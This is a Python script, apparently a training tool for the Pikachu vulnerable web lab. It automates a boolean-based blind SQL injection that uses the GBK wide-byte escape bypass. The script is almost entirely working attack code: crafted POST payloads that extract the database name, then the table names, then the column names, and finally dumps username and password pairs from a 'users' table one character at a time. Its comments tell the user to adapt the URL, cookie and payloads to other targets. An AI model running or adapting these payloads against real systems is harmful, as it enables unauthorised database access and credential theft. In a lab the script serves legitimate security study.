#!/usr/bin/python3
# coding=utf-8

"""
functions for boolean-based wide byte sql injection(blind)

:copyright: Copyright (c) 2021, Fancy Xiang. All rights reserved.
:license: GNU General Public License v3.0, see LICENSE for more details.
"""

import requests

url = "http://192.168.101.16/pikachu/vul/sqli/sqli_widebyte.php"               #有可利用漏洞的url，根据实际情况填写
headers={ 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Cookie": "PHPSESSID=7qgjcq21lsq834acodn0mo7km3",
    "Content-Type":"application/x-www-form-urlencoded"    #本行必须包括，否则requests模块自动进行url编码
    }    #http request报文头部，根据实际情况填写
 
keylist = range(33, 127)                                     #包括数字、大小写字母、可见特殊字符
flag = 'your uid'                                                              #用于判断附加sql语句为真的字符，根据网页回显填写

def CurrentDatabaseWide():
    n = 10                                                                      #预测当前数据库名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2 
    length = 0
    db = str()
    while True:
        if j>k and j<n and j-k>3:
            payload1 = "name=lili%df' or length(database())>"+str(j)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"           #所有payload根据实际情况填写，必须是字符串形式
            response = requests.post(url, data = payload1, headers = headers)     #本脚本根据POST型注入编写，遇到其他类型可修改方法和参数，其他所有函数中同样
            #print(response.request.headers)
            #print(response.request.body)
            if response.text.find(flag) != -1:
                n=n
                k=j
            else:
                k=k
                n=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload2 = "name=lili%df' or length(database())="+str(i)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
                param = {
                "name":payload2,
                "submit":"查询",
                }
                response = requests.post(url, data = payload2, headers = headers)
                if response.text.find(flag) != -1:
                    length = i
                    break
            break
        else:
            break
    print("the name of current database contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload3 = "name=lili%df' or ascii(substring(database(),"+str(i)+",1))="+str(c)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
            response = requests.post(url, data = payload3, headers = headers)
            if response.text.find(flag) != -1:
                db = db+chr(c)
                break
    print("the name of current database is "+str(db))
    
def TablesWide():
    n = 100                                                                     #预测当前数据库中所有表名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    tname = str()
    while True:
        if j>k and j<n and j-k>3:
            payload4 = "name=lili%df' or (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))>"+str(j)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
            response = requests.post(url, data = payload4, headers = headers)
            if response.text.find(flag) != -1:
                n=n
                k=j
            else:
                k=k
                n=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload5 = "name=lili%df' or (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))="+str(i)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
                response = requests.post(url, data = payload5, headers = headers)
                if response.text.find(flag) != -1:
                    length = i
                    break
            break
        else:
            break
    print("the name of all tables in current database contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload6 = "name=lili%df' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),"+str(i)+",1))="+str(c)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
            response = requests.post(url, data = payload6, headers = headers)
            if response.text.find(flag) != -1:
                tname = tname+chr(c)
                break
    print("the name of all tables in current database is "+str(tname))


def ColumnsWide():
    n = 200                                                                     #预测某个表所有列名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    cname = str()
    while True:
        if j>k and j<n and j-k>3:
            payload7 = "name=lili%df' or (length((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273)))>"+str(j)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
            response = requests.post(url, data = payload7, headers = headers)
            if response.text.find(flag) != -1:
                n=n
                k=j
            else:
                k=k
                n=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload8 = "name=lili%df' or (length((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273)))="+str(i)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
                response = requests.post(url, data = payload8, headers = headers)
                if response.text.find(flag) != -1:
                    length = i
                    break
            break
        else:
            break
    print("the name of all columns in current table contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload9 = "name=lili%df' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),"+str(i)+",1))="+str(c)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
            response = requests.post(url, data = payload9, headers = headers)
            if response.text.find(flag) != -1:
                cname = cname+chr(c)
                break
    print("the name of all columns in current table is "+str(cname))

def ContentWide():
    n = 200                                                                     #预测期望获取的数据的最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    content = str()
    while True:
        if j>k and j<n and j-k>3:
            payload10 = "name=lili%df' or (length((select group_concat(concat(username,0x7e,password)) from users)))>"+str(j)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
            response = requests.post(url, data = payload10, headers = headers)
            if response.text.find(flag) != -1:
                n=n
                k=j
            else:
                k=k
                n=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload11 = "name=lili%df' or (length((select group_concat(concat(username,0x7e,password)) from users)))="+str(i)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
                response = requests.post(url, data = payload11, headers = headers)
                if response.text.find(flag) != -1:
                    length = i
                    break
            break
        else:
            break
    print("the content contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload12 = "name=lili%df' or ascii(substr((select group_concat(concat(username,0x7e,password)) from users),"+str(i)+",1))="+str(c)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"
            response = requests.post(url, data = payload12, headers = headers)
            if response.text.find(flag) != -1:
                content = content+chr(c)
                break
    print("the content is "+str(content))
